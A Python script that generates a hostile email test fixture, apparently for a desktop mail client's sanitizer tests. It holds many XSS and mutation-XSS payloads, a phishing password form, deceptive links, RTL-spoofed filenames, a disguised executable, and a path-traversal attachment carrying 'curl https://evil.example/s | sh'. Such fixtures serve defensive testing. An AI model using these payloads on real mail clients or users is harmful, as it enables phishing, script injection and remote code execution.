#!/usr/bin/env python3
"""Build the hostile kitchen-sink .eml fixture next to this script.

Run:  python3 src-tauri/tests/fixtures/mail/hostile_kitchen_sink.gen.py
Then: UPDATE_HOSTILE_FIXTURE=1 cargo test --manifest-path src-tauri/Cargo.toml \
        --test mail_hostile_message   # refresh the frontend fixture too

Written as a generator rather than by hand because the HTML part is base64 so
that raw NULs, bidi controls and an unterminated comment survive verbatim
instead of being mangled by quoted-printable.
"""
import base64, textwrap, pathlib

RLO = "‮"

html = """<html><head>
<base href="https://evil.example/">
<meta http-equiv="refresh" content="0;url=https://evil.example/go">
<link rel="stylesheet" href="https://evil.example/s.css">
<style>@import url(https://evil.example/x.css); body{background:url(https://tracker.example/css.gif)}</style>
</head>
<body background="https://tracker.example/bodybg.gif">

<h1>Your account needs attention</h1>

<!-- 1. the obvious ones -->
<script>alert('script-element')</script>
<img src=x onerror=alert('img-onerror')>
<img src="x" ONERROR = "alert('spaced-handler')">
<svg><script>alert('svg-script')</script></svg>
<svg><a xlink:href="javascript:alert('xlink')"><text y="20">svg link</text></a></svg>

<!-- 2. mutation XSS: the payloads that need the renderer's own parse.
     NOTE: the `<math><mtext>` / `<svg><title>` integration-point payloads live
     at the very END of this document, because an unclosed one currently eats
     every sibling after it (see the fixture's closing section) and would
     otherwise mask every payload below. -->
<noscript><p title="</noscript><img src=x onerror=alert('noscript')>">
<template><script>alert('template')</script></template>
<xmp><script>alert('xmp')</script></xmp>
<textarea></textarea><script>alert('after-textarea')</script>
<![CDATA[<script>alert('cdata')</script>]]>
<!--[if IE]><script>alert('conditional-comment')</script><![endif]-->
<div><scr\x00ipt>alert('nul-in-tag')</scr\x00ipt></div>

<!-- 3. framing / embedding / navigation -->
<iframe src="https://evil.example/frame"></iframe>
<object data="https://evil.example/o"></object>
<embed src="https://evil.example/e">
<video poster="https://tracker.example/poster.gif"><source src="https://evil.example/v"></video>
<audio src="https://evil.example/a" autoplay></audio>

<!-- 4. credential harvesting in the body -->
<form action="https://evil.example/steal" method="post">
  <label>Confirm your Eldrun password</label>
  <input type="password" name="p">
  <input type="image" src="https://tracker.example/submit.gif">
  <button formaction="https://evil.example/steal2">Sign in</button>
</form>

<!-- 5. fake app chrome: a full-viewport overlay pretending to be Eldrun -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background-color:#1e1e1e;color:#fff;opacity:0.99">
  <strong>Eldrun</strong> &mdash; your session expired, re-enter your password
</div>
<div style="display:-webkit-box;-webkit-box-orient:vertical">vendor display</div>
<div style="filter:blur(2px);transform:scale(3);cursor:pointer;pointer-events:none">transform tricks</div>

<!-- 6. remote content: trackers in every attribute that can fetch -->
<img src="https://tracker.example/open.gif?u=victim%40example.org" width="1" height="1" alt="">
<img srcset="https://tracker.example/a 1x, https://tracker.example/b 2x" alt="">
<img src='http://tracker.example/single-quoted.gif' alt="">
<div style="background-image:url('https://tracker.example/inline.gif')">bg</div>

<!-- 7. links: every way a URL can lie about where it goes -->
<p>
<a href="javascript:alert('js-scheme')">plain javascript scheme</a>
<a href="&#106;avascript:alert('entity-scheme')">entity-encoded scheme</a>
<a href="jav&#x09;ascript:alert('tab-scheme')">tab-in-scheme</a>
<a href="  &#x0A;javascript:alert('newline-scheme')">newline-in-scheme</a>
<a href="vbscript:msgbox('vb')">vbscript</a>
<a href="data:text/html,&lt;script&gt;alert('data-url')&lt;/script&gt;">data url</a>
<a href="file:///etc/passwd">file url</a>
<a href="https://evil.example/login">https://bank.example/secure/login</a>
<a href="https://bank.example@evil.example/login">Your bank, definitely</a>
<a href="https://xn--bnk-qla.example/login">bank.example</a>
<a href="https://evil.example/x">bank.example""" + RLO + """gnp.exe</a>
<a style="color:#06c" href="https://evil.example/second-attr">attribute-order regression</a>
<a href="https://ok.example/" target="_top" rel="opener" download="payload.exe" ping="https://tracker.example/ping" onclick="alert('anchor-onclick')">extra attributes</a>
<a href="ftp://files.example/x">non-web scheme</a>
<a href="mailto:support@bank.example?subject=hi">mailto</a>
<a href="/relative/path">relative</a>
<a href="//tracker.example/protocol-relative">protocol-relative</a>
</p>

<!-- 8. layout bombs -->
<table><tr><td colspan="999999999" rowspan="999999999" width="99999999">bomb</td></tr></table>
<ol start="999999999"><li>x</li></ol>

<p>Regards,<br><b>Security Team</b></p>

<!-- 9. parser confusion, deliberately LAST: an unclosed MathML/SVG text
     integration point makes every following sibling a child of a foreign
     element, and the sanitizer drops a foreign element with its whole subtree.
     Fails closed (nothing executes) but eats the rest of the body, so it is
     kept at the end where it can only eat itself. -->
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert('mglyph')>
<svg><title><img src=x onerror=alert('svg-title')>
</body></html>
"""

plain = (
    "Your account needs attention.\r\n"
    "This is the text/plain alternative. It contains markup a naive renderer\r\n"
    "would happily execute: <script>alert('plain-part')</script> and a link\r\n"
    "<a href=\"https://evil.example/login\">https://bank.example/</a>.\r\n"
)

# An attachment whose bytes are a Windows executable but which claims to be a PNG,
# and whose name uses the RTL override to read as "invoicexe.png".
pe = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 56 + b"PE\x00\x00" + b"payload" * 16
bashrc = b"# appended by an attachment\ncurl https://evil.example/s | sh\n"
reserved = b"device name payload\n"

def b64(data: bytes) -> str:
    return "\r\n".join(textwrap.wrap(base64.b64encode(data).decode(), 76))

html_b64 = b64(html.encode("utf-8", "surrogateescape"))

eml = f"""Authentication-Results: evil.example; spf=pass smtp.mailfrom=bank.example; dkim=pass header.d=bank.example; dmarc=pass header.from=bank.example
Authentication-Results: evil.example (forged, and not even the topmost); dmarc=pass
From: "security@bank.example" <attacker@evil.example>
From: "IT Helpdesk" <helpdesk@evil.example>
To: victim@example.org
Cc: "‮eno" <one@example.org>
Subject: =?utf-8?B?{base64.b64encode(("Action required: verify your " + RLO + "account").encode()).decode()}?=
Date: Mon, 27 Jul 2026 09:00:00 +0000
Message-ID: <hostile-kitchen-sink@evil.example>
Reply-To: collect@evil.example
Return-Receipt-To: mdn@evil.example
Disposition-Notification-To: mdn@evil.example
List-Unsubscribe: <https://evil.example/unsub>, <mailto:unsub@evil.example>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="OUTER"

--OUTER
Content-Type: multipart/alternative; boundary="INNER"

--INNER
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 8bit

{plain}
--INNER
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: base64

{html_b64}

--INNER--

--OUTER
Content-Type: image/png
Content-Disposition: attachment; filename="invoice{RLO}gnp.exe"
Content-Transfer-Encoding: base64

{b64(pe)}

--OUTER
Content-Type: text/plain
Content-Disposition: attachment; filename="../../../../home/user/.bashrc"
Content-Transfer-Encoding: base64

{b64(bashrc)}

--OUTER
Content-Type: text/plain
Content-Disposition: attachment; filename="CON.txt"
Content-Transfer-Encoding: base64

{b64(reserved)}

--OUTER
Content-Type: image/gif
Content-Disposition: inline; filename="pixel.gif"
Content-ID: <pixel@evil.example>
Content-Transfer-Encoding: base64

{b64(b"GIF89a" + b"\\x00" * 32)}

--OUTER--
"""

out = pathlib.Path(__file__).with_name("hostile_kitchen_sink.eml")
out.write_bytes(eml.replace("\n", "\r\n").encode("utf-8", "surrogateescape"))
print(f"wrote {out} ({out.stat().st_size} bytes)")
